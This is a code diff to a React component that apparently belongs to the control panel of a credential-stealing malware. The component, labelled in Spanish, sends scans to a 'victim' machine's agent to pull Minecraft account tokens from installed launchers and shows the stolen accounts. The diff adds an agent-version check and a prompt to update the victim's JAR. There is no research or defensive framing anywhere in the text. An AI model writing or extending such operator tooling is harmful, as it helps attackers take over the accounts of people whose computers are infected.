@@ -7,6 +7,7 @@ import { Button } from '@/components/ui/button';
 import { dateTime } from '@/lib/format';
 import { toast } from 'sonner';
 import { useState } from 'react';
+import { versionAtLeast } from '@/lib/actions';
 
 type Account = {
   username: string;
@@ -26,6 +27,7 @@ export function MinecraftCard({ victim }: { victim: Victim }) {
   const task = (data?.items ?? [])[0];
   const result = task?.result as { accounts?: Account[]; errors?: string[]; files?: string[] } | undefined;
   const accounts = result?.accounts ?? [];
+  const supported = versionAtLeast(victim.agentVersion, '0.4.1');
 
   async function scan() {
     setBusy(true);
@@ -47,9 +49,10 @@ export function MinecraftCard({ victim }: { victim: Victim }) {
         <KeyRound className="h-3.5 w-3.5 text-muted" />
         <p className="text-2xs uppercase tracking-wide text-muted">Cuenta de Minecraft</p>
         {accounts.length > 0 ? <Badge tone="warn"><ShieldAlert className="h-2.5 w-2.5" />token sensible</Badge> : null}
-        <Button size="icon" variant="ghost" className="ml-auto" aria-label="Buscar token de Minecraft" loading={busy} disabled={!victim.socket} onClick={() => void scan()}><RefreshCw className="h-3 w-3" /></Button>
+        <Button size="icon" variant="ghost" className="ml-auto" aria-label="Buscar token de Minecraft" loading={busy} disabled={!victim.socket || !supported} onClick={() => void scan()}><RefreshCw className="h-3 w-3" /></Button>
       </div>
       {task?.status === 'error' ? <p className="mt-1 text-2xs text-bad">{task.error}</p> : null}
+      {!supported ? <p className="mt-1 text-2xs text-warn">Requiere agente 0.4.1; actualiza el JAR de la víctima.</p> : null}
       {!task ? <p className="mt-1 text-2xs text-muted">Sin lectura. Busca el token en launchers instalados.</p> : null}
       {task && accounts.length === 0 && task.status === 'done' ? <p className="mt-1 text-2xs text-muted">No hay cuentas con token en los launchers leídos: {(result?.files ?? []).join(', ') || 'ninguno'}.</p> : null}
       {accounts.map((account) => (
